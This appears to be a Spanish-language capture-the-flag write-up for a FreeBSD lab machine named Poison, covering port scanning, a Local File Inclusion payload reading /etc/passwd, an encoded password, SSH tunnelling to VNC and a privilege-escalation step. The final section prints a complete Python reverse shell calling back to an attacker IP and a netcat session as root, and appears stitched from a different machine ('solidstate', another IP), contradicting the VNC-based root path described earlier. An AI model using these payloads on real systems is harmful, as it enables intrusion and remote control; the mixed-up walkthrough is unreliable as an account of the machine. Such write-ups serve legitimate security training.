# Poison

![](../../../../~gitbook/image.md)Publicado: 13 de Mayo de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Medium
### 📝 Descripción
Poison es una máquina FreeBSD de dificultad media que alberga un sitio web vulnerable a Local File Inclusion (LFI). El camino para comprometer la máquina incluye la explotación de esta vulnerabilidad para obtener credenciales cifradas, seguido del descubrimiento de un servicio VNC ejecutándose localmente. La escalada de privilegios implica el aprovechamiento de un archivo secreto ZIP y la creación de un túnel SSH para acceder al servicio VNC ejecutándose como root, permitiendo así la obtención de la flag del sistema.
### 🚀 Metodología

### 🔭 Reconocimiento

#### Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
#### Escaneo de puertos

#### Enumeración de servicios

### 🌐 Enumeración Web

#### 80 HTTP
![](../../../../~gitbook/image.md)Encontramos un sitio web que nos permite introducir el nombre de un script para leer su contenido:![](../../../../~gitbook/image.md)Vale la pena analizar si el parámetro "file" está debidamente sanitizado y no es vulnerable a LFI o Path Traversal.Al introducir un valor de script que no existe, obtenemos un error, lo cual ya nos hace indicar que puede no estar bien sanitizado, ya que nos perite además ver la ruta del archivo completa:![](../../../../~gitbook/image.md)Probando el siguiente payload para leer el archivo /etc/passwd confirmamos la vulnerabilidad![](../../../../~gitbook/image.md)Otro de los archivos que tenemos es :
http://10.10.10.84/browse.php?file=listfiles.php el cual nos permite ver un archivo interesante llamado pwdbackup.txt![](../../../../~gitbook/image.md)Usando el siguiente payload leemos su contenido:
http://10.10.10.84/browse.php?file=pwdbackup.txtHay una nota junto a esta contraseña que nos indica que la contraseña se ha codificado 13 veces. A simple vista parece que está codificada en base 64, para hacer este proceso iterativo más rápido usamos la herramienta https://cyberchef.io/ y repetimos el proceso de decodificacion de base64 13 veces hasta obtener la contraseña:![](../../../../~gitbook/image.md)Tenemos una contraseña pero no tenemos usuarios, pero si nos fijamos en un pequeño detalle de cuando enumeramos el fichero /etc/passwd vemos que había un usuario llamado charix![](../../../../~gitbook/image.md)Probamos a intentar conectarnos vía ssh:Ganamos conexión al host remoto vía ssh:![](../../../../~gitbook/image.md)Obtenemos la flag del directorio /home/charix;
#### 👑 Escalada de privilegios
Al enumerar la máquina descubrimos un archivo .zip en el directorio /home/charix:Nos pide una contraseña, como no la tenemos, vamos a descargar el archivo a nuestro host de ataque para ver si podemos usar fuerza bruta:Usamos la contraseña que obtuvimos anteriormente y se extrae un archivo llamado secret cuyo contenido no es legible:![](../../../../~gitbook/image.md)Seguimos enumerando la máquina y listamos los servicios con![](../../../../~gitbook/image.md)Vemos que hay dos servicios que no están espuestos (5801,5901) que corresponden a servicios vncHacemos port forwading de ellos para enumerarlos y ver si hay algún posible vector de ataque:Ahora intentamos conectarnos a alguno de los puertos usando vncviewer y el fichero secret que habíamos encontrado anteriormente:![](../../../../~gitbook/image.md)Tras enumerar la máquina, comprobamos que sudo no está instalado en la máquina, tampoco hay grupos interesante ni capabilities. Tampoco detectamos una versión vulnerable del kernel, pero al listar procesos vemos algo intesante:![[Pasted image 20250513131131.png]]![](../../../../~gitbook/image.md)Se está ejecutando un script en python llamado tmp.py como root.Revisamos los permisos del archivo y vemos que tenemos control total sobre el mismo:Así que reemplazamos su contenido por el de una simple python reverse shell:Simple python reverse shell
https://github.com/orestisfoufris/Reverse-Shell---Python/blob/master/reverseshell.pyA continuación, esperamos unos segundos y recibimos la reverse shell como root para finalmente obtener la flag:Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🚀 Metodología](#metodologia)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)

```
❯ ping -c2 10.10.10.84
PING 10.10.10.84 (10.10.10.84) 56(84) bytes of data.
64 bytes from 10.10.10.84: icmp_seq=1 ttl=63 time=44.1 ms
64 bytes from 10.10.10.84: icmp_seq=2 ttl=63 time=44.8 ms

--- 10.10.10.84 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1005ms
rtt min/avg/max/mdev = 44.102/44.457/44.813/0.355 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.84 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
❯ echo $ports
22,80
```

```
nmap -sC -sV -p$ports 10.10.10.84 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-13 13:44 CEST
Nmap scan report for 10.10.10.84
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey:
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

```
http://10.10.10.84/browse.php?file=xphp
```

```
http://10.10.10.84/browse.php?file=../../../../../etc/passwd
```

```
This password is secure, it's encoded atleast 13 times.. what could go wrong really..
Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
Ukd4RVdub3dPVU5uUFQwSwo=
```

```
Charix!2#4%6&8(0
```

```
ssh charix@10.10.10.84
Charix!2#4%6&8(0
```

```
charix@Poison:~ % cat user.txt
eaa**********************
charix@Poison:~ %
```

```
charix@Poison:~ % unzip secret.zip
Archive:  secret.zip
extracting: secret |
unzip: Passphrase required for this entry
```

```
❯ scp charix@10.10.10.84:/home/charix/secret.zip .

(charix@10.10.10.84) Password for charix@Poison:
secret.zip
```

```
sockstat -4 -l
```

```
ssh -L 5801:127.0.0.1:5801 charix@10.10.10.84
ssh -L 5801:127.0.0.1:5901 charix@10.10.10.84
```

```
vncviewer -passwd secret localhost:5901
```

```
ps -aux
```

```
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 May 27  2022 ..
drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
-rwxrwxrwx  1 root root 1043 May 13 06:59 tmp.py
```

```
"""
A simple reverse shell. In order to test the code you will need to run a server to listen to client's port.
You can try netcat command : nc -l -k  [port] (E.g nc -l -k  5002)
"""

# Set the host and the port.
HOST = "10.10.14.7"
PORT = 5002

def connect((host, port)):
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
return s

def wait_for_command(s):
data = s.recv(1024)
if data == "quit\n":
s.close()
sys.exit(0)
# the socket died
elif len(data)==0:
return True
else:
# do shell command
proc = subprocess.Popen(data, shell=True,
stdout=subprocess.PIPE, stderr=subprocess.PIPE,
stdin=subprocess.PIPE)
stdout_value = proc.stdout.read() + proc.stderr.read()
s.send(stdout_value)
return False

def main():
while True:
socket_died=False
try:
s=connect((HOST,PORT))
while not socket_died:
socket_died=wait_for_command(s)
s.close()
except socket.error:
pass
time.sleep(5)

if __name__ == "__main__":
import sys,os,subprocess,socket,time
sys.exit(main())
```

```
nc -nlvp 5555
listening on [any] 5555 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.51] 53516
whoami
root
cd /root
ls -la
total 52
drwx------  8 root root 4096 May 13 05:28 .
drwxr-xr-x 22 root root 4096 May 27  2022 ..
lrwxrwxrwx  1 root root    9 Nov 18  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  8 root root 4096 Apr 26  2021 .cache
drwx------ 10 root root 4096 Apr 26  2021 .config
drwx------  3 root root 4096 Apr 26  2021 .gnupg
-rw-------  1 root root 3610 May 27  2022 .ICEauthority
drwx------  3 root root 4096 Apr 26  2021 .local
drwxr-xr-x  2 root root 4096 Apr 26  2021 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root   33 May 13 05:28 root.txt
-rw-r--r--  1 root root   66 Aug 22  2017 .selected_editor
drwx------  2 root root 4096 Apr 26  2021 .ssh
cat root.txt
f20************

```
